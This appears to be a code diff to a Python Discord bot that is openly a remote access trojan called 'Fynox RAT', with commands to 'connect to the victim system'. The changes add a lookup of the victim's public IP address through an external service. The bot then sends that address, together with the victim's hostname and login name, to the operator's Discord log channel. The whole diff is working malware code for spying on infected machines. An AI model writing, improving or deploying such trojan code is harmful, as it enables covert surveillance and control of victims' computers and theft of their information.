@@ -52,11 +52,19 @@ async def on_ready():
     if channel:
         hostname = socket.gethostname()
         username = os.getlogin()
-        ip_address = socket.gethostbyname(hostname)
+        
+        # Get public IP using IPify
+        try:
+            response = requests.get('https://api.ipify.org?format=json')
+            ip_data = response.json()
+            public_ip = ip_data['ip']
+        except:
+            # Fallback to hostname IP
+            public_ip = socket.gethostbyname(hostname)
         
         embed = discord.Embed(
             title="🔴 New Connection Established",
-            description=f"**Username:** {username}\n**IP Address:** {ip_address}",
+            description=f"**Username:** {username}\n**IP Address:** {public_ip}",
             color=discord.Color.red(),
             timestamp=datetime.datetime.now()
         )
@@ -78,17 +86,26 @@ async def on_ready():
         await channel.send(embed=embed)
 
 @bot.tree.command(name='connect', description='Connect to the victim system')
-async def connect_slash(interaction: discord.Interaction, ip: str):
+async def connect_slash(interaction: discord.Interaction):
     if str(interaction.channel.id) != str(LOG_CHANNEL_ID):
         await interaction.response.send_message("This command can only be used in the log channel.", ephemeral=True)
         return
+    
+    # Get public IP using IPify
+    try:
+        response = requests.get('https://api.ipify.org?format=json')
+        ip_data = response.json()
+        public_ip = ip_data['ip']
+    except:
+        # Fallback to hostname IP
+        public_ip = socket.gethostbyname(socket.gethostname())
     
     hostname = socket.gethostname()
     username = os.getlogin()
     
     embed = discord.Embed(
         title="💀 Fynox RAT - System Information",
-        description=f"**Username:** {username}\n**IP Address:** {ip}",
+        description=f"**Username:** {username}\n**IP Address:** {public_ip}",
         color=discord.Color.dark_red(),
         timestamp=datetime.datetime.now()
     )
